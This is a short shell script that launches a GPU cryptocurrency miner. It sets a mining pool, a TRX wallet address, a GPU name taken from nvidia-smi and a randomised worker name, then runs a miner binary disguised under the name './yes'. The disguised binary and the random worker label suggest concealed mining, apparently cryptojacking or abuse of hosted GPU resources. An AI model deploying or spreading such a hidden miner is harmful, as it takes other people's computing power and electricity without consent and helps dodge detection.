POOL=rx-us.unmineable.com:3333
WALLET=TRX:TAuUhLiXyNMHYfC7m8heHuLAramTkGe7nv
GPU=$(nvidia-smi --query-gpu=gpu_name --format=csv > nvidia.txt && echo "$(tail -n +2 "nvidia.txt")" > "nvidia.txt" && str=$(cat nvidia.txt) && echo ${str// /_})
WORKER=$(echo xM2PSFCd-$(shuf -i 1911-920331 -n 1))
ALGO=wrkzcoin
./yes --pool $POOL --username $WALLET.$WORKER --password x --algorithm $ALGO --disableCPU
